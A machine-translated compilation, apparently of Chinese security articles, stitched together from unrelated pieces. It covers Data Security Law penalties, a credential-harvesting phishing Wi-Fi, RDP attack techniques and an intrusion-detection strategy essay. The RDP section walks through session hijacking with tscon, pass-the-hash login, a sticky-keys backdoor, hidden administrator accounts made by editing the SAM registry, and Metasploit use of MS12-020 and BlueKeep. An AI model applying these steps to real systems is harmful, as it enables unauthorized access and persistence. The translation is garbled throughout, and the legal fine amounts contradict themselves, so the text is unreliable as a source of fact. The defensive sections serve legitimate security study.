In the legal responsibility of Chapter 6 of the Data Safety Law, the punished subjects were divided more carefully, and the upper limit of punishment was raised for the objects with serious circumstances. Moreover, in addition to economic punishment, the criminal responsibility is increased and the punishment intensity is greatly increased in addition.

Article 45 of the Data Safety Law, organizations or individuals who carry out data processing activities fail to fulfill the data security protection obligations stipulated in Article 27,29 and 30 of this Law, The relevant competent authorities shall order them to make corrections, Give a warning, He may also be fined not less than 50,000 yuan but not more than 500,000 yuan, The person in charge and other persons directly responsible may be fined a fine of not less than 10,000 yuan but not more than 100,000 yuan; Refusing to correct or cause serious consequences such as a large number of data leakage, A fine of not less than 500,000 yuan but not more than 2 million yuan, And may be ordered to suspend the relevant business, suspend business for rectification, revoke the relevant business license or revoke the business license, The person in charge directly responsible and other persons directly responsible shall be fined not less than RMB 50,000 yuan but not more than RMB 200,000 yuan.

In violation of the national core data management system and endangers the national sovereignty, security and development interests, the competent authorities shall be fined not less than 2 million yuan but 100 yuan, and order the relevant authorities to suspend relevant business, suspend business for rectification, revoke relevant business license or revoke their business license; if it constitutes a crime, it shall be investigated for criminal responsibility according to law.

Article 46 of the Data Safety Law, in violation of Article 31 of this Law, the relevant competent authorities shall order corrections, give a warning, and may be fined not less than 100,000 yuan but not more than 100,000 yuan. The directly responsible persons and other directly responsible persons may be fined not less than 10,000 yuan but not more than 100,000 but 10 million yuan. If the circumstances are serious, a fine of not less than 10 million yuan, and may be ordered to suspend relevant business, suspend business for rectification, revoke their business license, and fined not less than 100,000 yuan but 100,10 million yuan and other directly responsible persons.

Article 48 of the Data Safety Law who, in violation of Article 35 of this Law, refuses to cooperate with the data transfer shall be ordered by the relevant competent authorities to make corrections, give a warning, and impose a fine of not less than 50,000 yuan but not more than 500,000 yuan. The persons directly responsible shall be fined not less than 10,000 yuan but not more than 100,000 yuan and other persons directly responsible.

In violation of the provisions of Article 36 of this Law, those who provide data to foreign judicial or law enforcement agencies without approval from the competent authorities shall give a warning, impose a fine of not less than 100,000 yuan but 100,000 yuan but 100,000 yuan, may be fined not less than 1 million yuan, and may be ordered to suspend relevant business, suspend business for rectification, revoke their business license or revoke the directly responsible, and fined not less than 50,000 yuan but 500,000 yuan and other directly responsible persons.

Compared with the second draft, the Data Safety Law deleted and revised the following contents: 1. The change in the data security scope responsible for by all regions and departments stipulated in the General Provisions: from the generated, collected and processed data to the collected and generated data; the responsibility is changed from the main responsibility to the responsibility.

The establishment of the data security cooperation mechanism in the second draft has been changed to the publicity and popularization of data security knowledge to improve the awareness and level of data security protection of the whole society.

In the second draft, the state supports the transformation of secondary vocational schools and education and training on data development and utilization of technology and data security to educational institutions.

In summary, the introduction of the Data Safety Law and the urgent period that will be implemented in less than three months have aroused strong attention from practitioners, researchers and enthusiasts in the network security industry.

Through the above analysis, it can be found that the newly issued Data Safety Law has established the basic system of data classification and classification management, data security review, data security risk assessment, monitoring and early warning, and emergency response, which provides a legal guarantee for China's data security protection, and points out the direction of maintaining data security.

Zhou Hongyi, founder and C E O of 360, also said: " In the era of big data, all businesses are data-driven. Once sensitive data is locked in or leaked, it will cause significant economic losses or production paralysis.

The introduction of the bill is very necessary and timely, and will promote the security of the whole life cycle of social data, such as the collection, transmission, storage, processing, exchange and destruction, etc."The Data Security Law has a more detailed division of the responsibilities and obligations of enterprises and institutions, and provides different solutions for different actual situations, and has detailed provisions on data security protection in terms of breadth and depth.

After the adoption of the Data Safety Law, combined with the previously issued Network Security Law and the upcoming Personal Information Protection Law, it can be seen that China's cyberspace legal guarantee is becoming more and more perfect.

FreeBuf will continue to follow up on the deeper details of the Data Safety Law and its subsequent implementation.

With the situation of increasing enterprise security equipment and border security protection getting better and better, fishing attacks have gradually become the main method of red and blue confrontation drills.

With the update of devices such as mail server WAF and the gradual improvement of the security awareness of enterprise personnel, there have been more precautions against mail phishing attacks.

In the process of offensive and defensive exercises and authorization tests, the combination of near-source penetration and fishing attacks can achieve unexpected results, but the behavior is sometimes too obvious- -holding the MBP around the target and at the risk of being directly captured (live capture).

So the author made a fishing WIFI, which is small and not easy to detect, with a wide range of signals, followed by a low cost, which can be installed near the target.

Download the ESP8266FS, will be esp8266fs.Place jar into the t o o l s folder under the Arduino root, in MacOS, in format / Applications/Arduino.app/Contents/Java/tools/ESP8266FS/tool/esp8266fs.Take an authentication system as an example.

Download web page modify login interface is pass, username password is user,pass.

Here the author directly posted the code, and made a detailed annotation to the code, I hope that readers read carefully, the key is on the code of receiving the transmitted data and storing the process, can draw inferences from one example.

After saving the project, a folder storage code file is automatically generated. After configuring the development board and port according to step 3, click to compile and upload, and wait for the successful upload.

After the author's not rigorous test, the open space WiFi range can reach about 200m.

At the same time, readers can draw more targeted changes to fishing methods and code, not repeated here.

Account password storage can be written to the storage rather than memory (power emptying), because the author recently other things, update time to be determined.

In the penetration test, sometimes after taking a host, you will choose to drive 3389 into the remote desktop to see if there is something valuable in the other host.

But the use of the remote desktop is not only that, this section we will have a preliminary summary of the remote desktop in the internal network penetration of the various utilization posture.

If there is something wrong, the article also please comment on my blog: https://whoamianony.top/RDP Protocol RDP,Remote Desktop Protocol, Remote Desktop Protocol, an internationally standard multi-channel conference protocol issued by the International Telecommunications Alliance T.An extension of the 120.

The remote desktop protocol lets users connect to computers that offer Microsoft terminal services.

Most of the Windows, Linux, FreeBSD, Mac OS X s have the corresponding clients.

The Remote Desktop protocol listens to TCP 3389 port data by default.

The Remote Desktop protocol provides users with a graphical interface to log on remotely to another computer via a network connection.

In actual combat, an attacker can use the Nmap to scan the target host to see whether port 3389 is open. If the target host opens port 3389, we can violently guess the remote desktop login password of the target host.

As shown in the figure above, the login password for the target host administrator was successfully obtained, with which a credential attacker can log on to the Remote Desktop Service.

For an Windows system that opens the Remote Desktop Service, multiple sessions occur when multiple users log in to the system in the figure below: where the administrator user Administrator is logged in locally and the user bunny is connected through the Remote Desktop Service.

Next, if the user Administrator wants to switch to the remote desktop of the user bunny, you can connect by the right-key connection, and then enter a password to switch to the bunny user.

After clicking OK, the bunny users were successfully switched to the remote desktop, as shown in the figure below.

Also there is a tscon command in Windows that is a tool used under the command line and can implement the same functionality as described above.

However, this does not fully ensure the security of the session. The attacker can completely bypass the verification through special utilization methods and switch to the target session without entering the password, so as to realize the unauthorized login of the target user.

The particular approach mentioned here is to execute the t s c o n session switching command directly under SYSTEM permission.

At this time, the attacker can freely switch the session desktop without providing other user login credentials, realizing the hijacking of the RDP sessions of other users.

RDP session hijacking in specific circumstances can show, for example for the new Windows system, by default is not export user explicit password, by this time we can not switch to another user's desktop, so we can use the method mentioned above, first to SYSTEM rights, then hijack target user RDP and switch to the past.

A particular note is that even if the remotely connected user closes the remote connection window, it will not hijack the reply, just showing "disconnected" in the background.

You can still achieve unauthorized connections under SYSTEM permission.

High rights users hijacking RDP users hijack RDP users hijack R D P sessions is relatively simple to use, because you have administrator privileges, you can obtain SYSTEM privileges directly by creating services and other ways.

Since Windows runs the service with SYSTEM permission, our command will also run with SYSTEM permission, which can successfully hijacking the target user session without providing the target user password.

Low permission users hijack RDP of high permission users low permission users hijack RDP sessions of high permission users are not as simple as the former, because the permissions are too low, so unable to execute the creation service, execute Psexec and other high permissions commands.

So if the low-permission user wants to hijack the RDP of the high-permission user, they need to find a way to raise the rights and raise their rights to SYSTEM.

Experimental environment is as follows: assuming there is such a situation, there is a Windows Server 2012 system server, the local login with a common domain user bunny: we somehow obtained the bunny user login password, and use the bunny user remote login: at this time, after check the task manager found that the background administrator user Administrator session.

Next we tried to hijack this administrator user.

First make the target host launch an M S F with a bunny user permission, and then get the System permission of the target machine through various system vulnerabilities: and then go to the shell to execute the tscon command for hijacking.

The new version of the RDP Remote Desktop Windows Server 2012 R2 uses the new version of the RDP Remote Desktop protocol, which has a limited administrator feature.

I believe that both penetration testers and system administrators will be interested enough in this feature, because with this feature, we can achieve hash pass attacks and successfully log on to the remote desktop.

In the case that the captured Hash cannot be cracked, if the target host opens the "Restricted Admin Mode" is also ok, then we can use Hash to directly achieve RDP remote login.

Then I got another version of Windows successful: Note that the restricted administrator mode here, as the name suggests, is only valid for the administrator group.

So if the users you get belong to the remote desktop user group, you cannot log in through Hash.

RDP Remote Desktop middleman attacks often result in credential capture.

Similarly, in a middleman attack on an RDP session, the attacker can obtain a plain text password for the login user for later lateral movement.

When the RDP blasting doesn't work, we might as well try the middleman.

Seth is an R D P middleman attack automation tool written in Python and Bash that enables MitM RDP connections by attempting to downgrade connections to extract plain credentials regardless of network-level authentication enabled or not.

Not only that, but you can record the operation of the user's keyboard and even execute commands on the target host.

Get RDP Remote Desktop Connections Records In penetration tests, the history of remote desktop connections cannot be ignored, and you can often locate key servers based on the history.

Next we introduce a history of how to export RDP connections.

Getting the RDP Remote Desktop connection record can be done by enumerating the registry, but if you want to get the history of all the users, you need to get the user's NTUSER. one by oneDAT files, through the configuration unit loading of the registry, import the user configuration information, and then enumerated can be realized.

Export the history of log-in users The registry information of logged-in users is saved simultaneously in the directory, to correspond to the SID of each user.
As you can see, the current system logs in to three users, each with three subsystems respectively.

We can get the remote desktop connection history of logged-in users by enumerating the registry key values: that is, if the current host is logged into two users, the registry information for both users is saved below.

However, if the third user is not logged in, and the user's registry information is not available directly at this time, the following error will be reported: the user's remote desktop connection history cannot be exported directly.

Export all users' history just said before, for unlogged in users, can not directly obtain the registry configuration information, then what is the solution?

In fact, it can be solved here by loading the configuration unit, that is, to open the user's NTUSER.The DAT file, load the configuration unit to import the user configuration information, and then enumerate.

Select to Open the user's NTUSER.The DAT file, path is, here is the currently unlogged in moretz user.

Specifying an item name then read the user's registry configuration information under HKEY_USERS.

Then follow the previous path to enumerate it.

If you press the shift key five consecutive times on your computer, you will find a program called a "sticky button" to pop up on the computer screen.

The program can pop up by pressing five shift keys even before logging in to the system.

Think about if we know the absolute path of this program then we can cmd.The e x e is disguised as this sticky key program, and when we press shift five times, a CMD command line window popup, so we can control the target host without logging in to the system.

The sticky key program name is " sethc.The e x e ", with the path"  "c:\\windows\\system32\\sethc."exe”。

Using sticky bonding as backdoor is a common continuous control.

The basic process is as follows: First, we manually or use the tools to find the sethc.The e x e deleted or renamed it the sethc.exe.The bak, and then will the cmd.The e x e program copies a copy and named " sethc.exe”。

Finally, when the computer presses the Shift button again, the CMD interface pop up and the back door is successfully made.

At this point, we open the remote desktop of the target host, and press the shift key for five consecutive times, so that you can see a CMD window successfully popup on the target host screen.

The cmd is running with SYSTEM permission, then we can not need to know the login password, no login, no need to log in, directly bypass the login page to face the target host to perform a variety of high permission operations, we can also build a new high permission user to log in directly to enter the system, is it very interesting?
At this point, we will first simulate a token with the TrustedInstaller permission to obtain the TrustedInstaller permission, before doing the above operation.

Process TrustedInstaller. starts when we start the TrustedInstaller serviceThe e x e, the permission of the program has is NT SERVICE\\TrustedInstaller, then we can steal the token of the process.

Since the CMD obtained at this time is SYSTEM permission, we can directly take the RDP into the target system.

If you find that there are three user sessions on the target host, we can hijack and switch at will.

After executing the command, it was successfully hijacked and switched to the administrator user's session.

In addition to the sticky key sethc here, there are many aids on the Windows login interface.

With an on-screen keyboard, a magnifying glass, screen reading, etc., these additional accessibility options can help disabled people use the operating system more easily.

These aids can all be used by the attacker to make a backdoor like the sticky key sethc.

Modules in Metasploit can automatically utilize the permission maintenance technology of block keys.

The module will be used in cmd.The e x e replaces those auxiliary binaries

At this point, we open the remote desktop of the target host, and when we click the auxiliary function button in the lower left corner, the CMD window successfully popup and has SYSTEM permission.

Not only is the CMD, we can switch to any Payload for fishing and trigger the Payload attack when the victim uses the response function.

Windows system hidden account This method is to make a system user who can make a remote desktop to the target host to maintain the target Windows system permission.

As in the figure above, we have created successfully, executed the net user command, and found no user.

Then, in order to enable newly created users to log on to the remote desktop of the target machine, we also need to add users to the computer remote.

You can directly use the 3389 remote desktop

However, the concealment is still insufficient, because in the control panel and the computer-managed local users and groups: in order to better hide our backdoor account, we also open the remote desktop of the target host as follows.

Open the registry editor, find, stand-alone right build, select "Permissions", set the Administrator user permission to "full control" permission, and then close the registry editor, and open it again.

So that all the files under the SAM can be seen.

Then, at the Registry Editor, click the Administrator user to find the same directory name of the type "0x1f4" on the left and the key value displayed on the right, meaning the arrow directory "000001F4".

Copy the value of the F key in the directory and find the same directory name as the key value on the right type of the hidden account, or "000003EA."

Then paste the F value into the F value and click OK.

Then right-export subkey sums from the registry and use the delete user.

At this point, view the registry and local users and groups or control panel, and the whoami$ users are gone.

Finally, just export the two suffixes as.The registry entry for the r e g is imported into the registry.

This way our hidden accounts are created.

Now, whether you enter the net user at a command prompt or cannot see the account at the system user management interface, visible only in the registry.

Remote Desktop-related vulnerability on the 3389-port DOS attack This exploit is the MS12-020 Remote Desktop Protocol R D P Remote Code execution vulnerability (CVE-2012-0002) that exploded in 2012.

This vulnerability is due to Windows errors in handling some objects that can access uninitialized or deleted objects via specially made RDP messages, resulting in arbitrary code execution and then control the system.

Below we use the Windows 7 system for reuse.

There are two exploit modules for this vulnerability in Metasploit.

First to determine whether the target host is vulnerable to the vulnerability, detection can be performed using the second command.

The target machine has the vulnerability, and then tries to attack with the first module, which will launch a DOS attack on the target system, eventually resulting in the blue screen of the target system.

You can see from the figure above that the target system is shutting down due to some problems.

DoS attack executors often attack sites or services hosted on high-end Web servers such as banks or credit card payment gateways, denying their machine or network resources by temporarily or disrupting host services connected to the Internet indefinitely.
On May 14,2019, Microsoft officially released a security patch fixing the Remote Code Execution Vulnerability (CVE-2019-0708) for Windows Remote Desktop Services, which attacked via Remote Desktop Port 3389, RDP protocol.

This vulnerability is pre-authenticated and without user interaction, which means it can be exploited by network worms.

Any malware that exploited this vulnerability could spread from infected computers to other vulnerable computers in a similar way to WannaCry malware in 2017.

There is available in Metasploit: the first module to detect the target machine, and the second module to attack.

The attack was successful and got the meterpreter.

How to defend against your RDP Add security policies to Prevent Violence Cracking An Administrator can use account lock policies to protect its network from violent crack attacks, with the following relevant policies.

When the user exceeds the login attempt of the account lock threshold setting, it locks the time specified by the account.

Account Lock Threshold: A policy that defines the number of failed logon attempts locks the account within the period specified by the account lock duration.

It will allow a maximum number of specified attempts to log in to your account.

Locked account lock counter: Policies that define the time period that must elapse after a login attempt fails.

The reset time must be less than or equal to the account lock time.

Port modifications can forward port 3389 on another port to improve system security.

We have initially summarized the variety of remote desktop penetration in the Intranet.

In the next section, we will continue to explore the relevant utilization of remote desktop after Intranet penetration.

The higher the value of the company, the greater the threat of invasion, and even the Internet originator like Yahoo, is still suffering from full data theft at the end of things.

Security is no trivial matter, once the Internet companies are successfully "invaded", the consequences will be unimaginable.

Based on the "attack and defense confrontation" considerations, this article will not mention the specific attack detection models, algorithms and strategies, and those who want to directly copy the "invasion strategy" may be disappointed.

However, we will share some of the operation ideas and please give you. If you can help the latecomers, it will be better and welcome to communicate and discuss with us.
Hackers in far away, remotely control the target laptop through the network, and then casually read the target's private data of the target, or use the functions on the target system, including but not limited to using the mobile phone microphone monitoring target, using the camera peeping monitoring the target, using the computing power of the target device mining, using the target device's network ability to launch DDoS attacks and so on.

Or cracked a service password, go in to check the sensitive information, control access control.

All of these belong to the classic invasion scenes.

We can give the next definition of invasion: hackers in unauthorized control, use our resources (including but not limited to read and write data, execution commands, control resources, etc.) to achieve various purposes.

In a broad sense speaking, hackers use SQL injection loopholes to steal data, or get the account password of the target domain name in the ISP, to tamper with DNS to a black page, or find the target social account, on Weibo, unauthorized control of virtual assets belong to the category of invasion.

Intrusion detection The scope of enterprise intrusion detection is relatively narrow in most cases: it generally refers to the behavior of hackers' control over PC, system, server and network.

The most common way for hackers to control host assets such as PC, server is to execute instructions through Shell, and this action of Shell is called GetShell.

For example, through the upload vulnerability of the Web service, get the WebShell, or use the RCE vulnerability to execute the commands directly.

In addition, in some way, the first implant of the "Trojan back door", the subsequent direct use of the Trojan integrated SHELL function to remotely control the target, this is also more typical.

Therefore, intrusion detection can focus on this action of GetShell, as well as the malicious behavior after its success.

Some peers like to report some "previous external scanning, attack detection and attempt behavior" of GetShell, and are well called "situational awareness," telling companies that people are "trying to attack."

Many enterprises, including Meituan, are basically under "unidentified" attack all the time, and they know that someone is "trying" to attack. If they can not effectively act or effectively alarm the action, there is not much practical value in addition to consuming effort.

When we are used to "attack" is normal, will be in this normal to solve the problem, can use what reinforcement strategy, which can achieve normal operation, if there is any strategy cannot normal operation, such as the need for a lot of people to work overtime temporary assault, the strategy will soon gradually disappear.

There is no essential difference from us in not doing this strategy.

Similar to SQL injection, XSS and other W e b attacks without direct GetShell, they are not considered in the narrow sense of "intrusion detection". It is suggested that they can be classified into "vulnerability", "threat perception" and other fields and be discussed separately.

Of course, using SQL injection, XSS and other entrances, GetShell operation, we still grasp the key point, do not have to care where the vulnerability entrance is.One scene with "invasion" and "Inner ghost" close to the invasion is "Inner ghost".

The invasion itself is the means, GetShell is just the starting point, the hacker GetShell is to control resources and data theft.

The "inner ghost" naturally has legal authority and can have legal access to sensitive assets, but for purposes outside of work, they conduct illegal disposal of these resources, including copies, transfer leakage, tampering with data for profit.

The behavior of the internal ghost is not in the category of "intrusion detection", but is generally managed and audited from the perspective of internal risk control, such as the separation of responsibilities, two-person audit, etc.

There are also data leak prevention products to assist it, here do not elaborate.

Sometimes, hackers know that employee A has access to contact the target assets, then attack A, and then use A's permission to steal data, which also defines it as "invasion".

After all, A is not a subjective and malicious "inner ghost".

This intrusion detection also fails if it cannot be captured at the moment of hacking A, or cannot distinguish A stolen data controlled by the hacker from access data by normal employee A.

The nature of intrusion detection has been mentioned before, invasion is that hackers can operate our assets without our consent, and there is no limit in means.

So how to find out the difference between the invasion behavior and the legal and normal behavior, and separate it from the legal behavior, is the "invasion discovery".

This is a labeling problem on algorithmic models.

Unfortunately, the "black" samples of such invasion are particularly rare, and it is difficult to find out the law of invasion through a large number of labeled data and supervised training of invasion detection models.

As a result, intrusion detection strategy developers often need to invest a lot of time to refine more precise expression models, or to spend more effort to construct "intrusion-like" simulation data.

A classic example is that to detect WebShell, security practitioners can go to GitHub for some public WebShell samples in about less than 1,000.

The data is far from enough for machine learning.

Moreover, from the perspective of technology on GitHub, there are a large number of similar samples generated by a single technical technique, and some antagonistic technique samples are also missing.

Therefore, such training, trying to allow AI to master the characteristics of WebShell and distinguish them through "large numbers of samples", is in principle unlikely to achieve perfectly.

At this time, make technical classification for known samples and refine more accurate expression models, which is known as traditional feature engineering.

The traditional characteristic engineering is often regarded as inefficient repetitive labor, but the effect is often relatively stable, after all, adding a technical feature can stably find a class of WebShell.

Construct a large number of malicious samples, although there are machine learning, AI and other halo support, but often difficult to succeed in the real environment.

Automatically generated samples are difficult to describe what WebShell originally meant, mostly describing the automatically generated algorithmic features.

On the other hand, the difference in invasion is to see whether the act itself is "authorized", and whether the authorization itself has no significant distinguishing feature.

Therefore, when doing invasion confrontation, if some kind of reinforcement can be converged to a limited channel, and make a strong distinction between the channel, it can greatly reduce the cost of invasion detection.

For example, strict certification of access sources, whether natural person, or program API, require legal bills, and when issuing bills, do multiple latitude certification and authorization for different situations, and then use IAM for these notes and monitor the scope of their can access, can also produce a lower Log do abnormal access model perception.

This whole life-cycle risk control model is also the premise and foundation for the implementation of Google's BeyondCorp borderless network.

Therefore, there are two main ideas of invasion detection: mode matching according to the black characteristics.

According to the business historical behavior, the abnormal comparison of the invasive behavior is made. If the historical behavior of the business is not converged enough, it will be converged by means of reinforcement, and then the non-compliant minority abnormal behaviors are picked out.

Intrusion detection and attack vectors depending on the target, the possible exposure to the hacker will be different attack surface, the hacker may be completely different.

For a clear "target", the channels it is accessed may be a finite set and the required path to be attacked.

Therefore, when talking about the effect of the intrusion detection model, it is necessary to clarify the attack vector first, and collect the corresponding log for different attack paths, so as to do the corresponding detection model.

For example, the S h e l l command dataset, based after SSH login, can not be used to detect the behavior of WebShell.

Based based data, it is impossible to perceive whether hackers perform any commands in the S h e l l environment after SSH.

Based on this, if an enterprise does not mention the specific scene, said to do a good APT perception model, is obviously "in" bragging.

Therefore, invasion detection has to first list all kinds of attack vectors first, each subdivision scene collects data separately, and then combined with the actual data characteristics of the company, to make a corresponding detection model according to the actual situation of the company.

The technology stack, data scale, exposure of different companies, will have a significant impact on the model.

For example, many security workers are particularly good at WebShell detection under PHP, but they have come to a Java department company......If the common intrusion methods of hackers are poorly understood, it is difficult to target, and sometimes even fall into the trap of "political correctness".

For example, the penetration test team said, we did A action, you didn't find it, so you can't.

In reality, the scene may not be a complete invasion chain, and even if the action is not found, there may be no effect on the invasion detection effect.

The harm that each attack vector causes to the company, how to sort the probability of occurrence, and solving the cost and benefits, all require professional experience to support and make decisions.

Now for a brief introduction of the classic process in the hacking tutorial.

The hackers may not understand a target, so the first thing is often to "check", that is, to collect information and deepen their understanding.

Hackers need to know, what assets are targeted, how is their respective status, whether there are known vulnerabilities, who manage them, and what known leaked information exists.

Once the check is completed, skilled hackers will brew and verify the feasibility of the "attack vector" for the characteristics of various assets, listing common attack methods and defense suggestions below.

High-risk service intrusion into all public services is "high-risk service", because the agreement or implement the open source components of the agreement, there may be known attack methods, as long as your value is high enough, hackers have enough motivation and resources to dig, so when you open the high-risk service to the Internet, to everyone open that moment, is equivalent to opening the "door" for hackers.

For example, SSH, RDP and these operation and maintenance management-related services are designed for administrators. As long as they know the password / secret key, anyone can log on to the server side, and then complete the intrusion.

The hacker may get the credentials by guessing the password.

In fact, such attacks are so common that hackers have long made fully automated all-Internet scanning worm tools. If a host purchased on the cloud has a weak password, it will often infect worms in a few minutes, just because there are too many such automated attackers.

Maybe, your password is very strong, but that's no reason why you can continue to expose the service to the Internet, we should limit these ports to allow our own IP access, completely break the possibility of hackers to invade us through it.

Like this, MySQL, Redis, FTP, SMTP, MSSQL, Rsync and so on, all the services that they use to manage servers or databases or files, should not be unlimited open to the Internet.

Otherwise, the helminized attack tools will breach our service in just a few minutes, even encrypt our data directly, and even ask us to pay for bitcoin and extort money.

There are also high-risk services with RCE vulnerabilities, allowing hackers can exploit the ready exploit, direct GetShell, as long as the port is open.

The cost of intrusion testing for each high-risk service is high, because high-risk services are very many specific points, and there are not necessarily general characteristics.

Therefore, through the reinforcement way, the convergence attack entrance is more cost-effective.

Ban all high-risk ports from opening to the Internet, which can reduce the probability of invasion by more than 90%.

As Web intrusion reinforce the high-risk ports, many of the attacks in the hacker knowledge base will fail.

But Web services are the main form of service for modern Internet companies and can not be turned off.

Thereupon, based on the PHP, Java, ASP, ASP.Dynamic W e b service vulnerabilities such as C G I written by NET, Node, C have become the main entry point to hacking.

For example, using the upload function to directly upload a WebShell, using file inclusion function, directly quote a remote WebShell, and then use code execution function, to execute any commands directly as the Shell entrance to execute any commands, parse some pictures, video services, upload a malicious sample, trigger the vulnerability of the resolution library.

Of course, because they are all made by Web services as entrances, invasions also common in a sense.

It is relatively easy to find some differences between hacker GetShell and normal business behavior.

For intrusion trace detection of Web services, you can consider collecting WAF logs, system calls from Access Log, Auditd records, or Shell instructions, and network-level Response-related data to extract the features of attack success, suggesting that we focus mainly on these aspects.

0 The d a y invasion looks through the leaked toolkit, and in earlier years the N S A had 0day weapons that would directly attack Apache, Nginx on these services.

This means that the opponent probably doesn't care about what our code and service look like, take 0day and GetShell without a dozen.

But for intrusion detection, this is not scary: because no matter what vulnerabilities the opponents exploit as an entrance, the Shellcode it uses and the subsequent behavior itself remain in common.

Is there a 0 d a y vulnerability in Apache attacked, or is there a low-level code vulnerability in a PHP page exploited. From the perspective of the intrusion, maybe exactly the same, the intrusion detection model can be universal.

So focusing on hacking GetShell portals and after behavior may be more valuable than focusing on vulnerability portals.

Of course, the specific vulnerability use or to actually follow up, and then verify that its behavior meets expectations.

Office terminal intrusion most of the APT reports, hackers first start to people (office terminal), such as sending an email, coax us to open, control our PC, and then long-term observation / browsing, get our legal credentials, and then to the internal net roaming.

So most of these reports are focused on describing the Trojan horse used by hackers and family code similarity.

Most of the anti-APT products and solutions are also in the office terminal system call level, with similar methods, to test the elimination of "Trojan horse" behavior.

Therefore, EDR products + mail security gateway + office export behavior audit, sandbox of APT products, etc., can collect corresponding data and similar intrusion detection perception model made.

The most important point is that hackers like to focus on the important internal infrastructure, including but not limited to AD domain control, mail servers, password management system, permission management system, etc.

So for the company, the important infrastructure needs to be targeted, and Microsoft has even issued a special white paper on AD.

The basic principle of intrusion detection cannot equate a model where every alarm is completely followed up with an invalid model.

We have to block repeated similar alarms to focus on keeping each alarm closed loop.

This creates a whitelist, which is the omission of the model is inevitable.

Since any model has underreporting, we have to do multiple models at multiple latitudes to form association and depth.

Assuming that WebShell static text analysis is bypassed by hacker deformation, malicious calls at RASP can also be monitored, giving the option to accept underreporting from a single model, but still discovery overall.

Since every single scene model is misreported and missed, what scene we do and do not do, we need to consider the "cost performance".

Some deformed WebShell s can be written as very similar to the business code, people almost cannot be identified by the naked eye, and then the pursuit must fight in text analysis, is a very poor cost-effective decision.

If the RASP detection scheme, it is more cost-effective and more feasible.

It's not easy to know all the techniques hackers attack and less likely to build strategies for each.

Therefore, for key businesses, it needs to be strengthened, so that the path that hackers can attack is extreme convergence, only in the key link of confrontation.

At least it can have the ability to protect the core business.

Based on the above principles, we can know the fact that we may never do 100% find intrusion on a single point, but we can use some combinations that make it difficult for attackers to bypass all the points.

When the boss or blues challenge, a single point of detection ability is missing, if in order to "political correctness", endless investment on this single point, trying to do a single point 100% discovery ability, most of the time may be just in trying to create a "perpetual motion", pure waste of manpower, resources, without the actual income.

Will save resources, cost-effective layout of more depth defense chain, the effect will obviously be better.

After all, the mainstream form of intrusion detection products is to model based on data. For example, the detection of WebShell should first identify the Web directory, and then conduct text analysis of the files in the Web directory, which needs to be a collector.

An intrusion detection model based on the Shell command requires obtaining all of the Shell commands, which may require the Hook system to call or hijack the Shell.

Detection based on network IP reputation, traffic payload, or content based on the mail gateway, may be implanted into the network boundary to bypass traffic.

There are also some integrators who collect the logs based on multiple Sensor,, collect them in a SOC or SIEM, and then hand them to the big data platform for comprehensive analysis.

Therefore, the industry intrusion detection related products are roughly divided into the following forms.

After a hacker attacks the host, the action on the host may produce logs, processes, commands, networks, and other traces, so deploying a collector on the host is called the host-based intrusion detection system, referred to as HIDS.

Of course, some APT manufacturers often also have Sensor/Agent, s on consoles, such as FireEye.

Since most attack vectors have strong features to target some payload, or control targets through the network, they have the advantage of recognition at the network level.

This kind of products allows the host, network equipment and applications to output their own logs and focus on a unified background, where comprehensive analysis of all kinds of logs to determine whether to describe multiple paths of an invasion behavior can be associated.

APT sandbox: Sandbox products are closer to a cloud version of the advanced anti-virus software, which simulates the observation behavior to combat the characteristics of the weak characteristics of unknown samples.

However, it requires a simulation operation process, large performance cost, early was considered a "not cost-effective" solution, but because the hidden behavior of malicious files is difficult to confront the features, so it has now become the core component of APT products.

Through the network traffic, terminal collection, server suspicious sample extraction, mail attachment extraction and other unknown samples obtained, can be submitted to the sandbox to run through the behavior, to determine whether it is malicious.

There is no actual product for the mobile terminal, and it is not very necessary.

The first thing for PC is anti-virus software. If malicious programs can be detected, intrusion can be avoided to a certain extent.

But if you encounter a kill-free premium 0day and trojans, antivirus software can be bypassed.

Drawing on the idea of HIDS on the server, the concept of EDR was also born. In addition to the local logic, the host is more important to collect more data to the back end, and carry out comprehensive analysis and linkage in the back end.

Others say that the next generation of antivirus software will have EDR capabilities, but the current sales are still sold separately.

This indicator must be the most intuitive.

The more troublesome is the denominator. Many real invasions. If there is no external feedback and we do not detect it, it will not appear in the denominator, so the effective discovery rate is always artificially high. Who can guarantee that all the current invasions are found?

In addition, the real invasion is actually a low-frequency behavior, and if large Internet companies are invaded hundreds of thousands a year round, it is certainly not normal.

Therefore, if there is no real invasion case for a long time, this indicator does not change for a long time, and it cannot describe whether the invasion detection capability is improving.

So, we will generally introduce two indicators to observe: blues against active discovery rate known scene coverage of blue active high frequency confrontation and exercises, can make up for the lack of low frequency, but because the blues grasp the attack technique is often limited, they exercise after many times, technique and scene may be listed.

Assuming that the builder of a certain scene has not yet made up its capacity, the Blues posture exercises 100 times and add 100 undiscovered exercises, which will not provide more help to the builder.

Therefore, it is a good way to build the attack coverage is also a good evaluation index.

The intrusion detection team focuses on the priority evaluation and rapid coverage of known attack techniques, and should have its own professional judgment on how far the construction meets the needs.

The same incident is only the first alarm, repeated automatic aggregation.

Have the ability to misreport and self-learning.

Alarms are readable and Key-Value mode alarms are discouraged, as recommended for describing core logic and response processes in natural language.

There are clear description documentation, self-test report.

There is a blue army for the scene of the actual combat acceptance report.

It is not recommended to call WeChat, SMS and other interfaces. A unified alarm incident framework can effectively manage events to ensure a closed loop, and can also provide long-term basic operation data, such as stop-loss efficiency and false positives.

The strategy person's documentation should indicate what situations the current model senses and which premises cannot be alerted.

From the above judgment, a self-score can be formed on the maturity of the strategy, roughly estimated 0-100.

A single scene is often hard to reach 100, but that doesn't matter because the marginal cost rising from 80 to 100 can become high.

It is not recommended to pursue the extreme, but to look at whether to quickly put into the next scene.

If a scene with less than full score often appears real confrontation and there are no other strategies to make up, the self-assessment conclusion may need to be reviewed and improve the acceptance standard raised.

No corresponding strategy has been built yet.

The model relies on part of the basic data error, making the wrong judgment.

So in fact, for an invasion event to be captured, we need an intrusion detection, long, high quality, high available system to run.

It is a very professional job beyond the vast majority of safety engineers' ability and will.

It is therefore recommended to assign a dedicated operating person responsible for the following objectives: the integrity of the data acquisition.

Every policy moment works correctly.

Accuracy of the basic data.

Convenience of work order operation support platform and traceability auxiliary tools.

Dozens of business modules, and hundreds and thousands of machines, are involved.

In terms of digital scale, as much as the entire data centers of some small and medium-sized enterprises.

Such a complex system, to remain at high availability standards for a long time, itself requires specialized support from auxiliary roles such as SRE, QA.

If you only rely on individual safety engineers, it is difficult for them to study safety attack and defense, and also take into account the quality of basic data, the availability and stability of service, the change and standardization at the time of release, various operational indicators and the timely response of operation and maintenance faults.

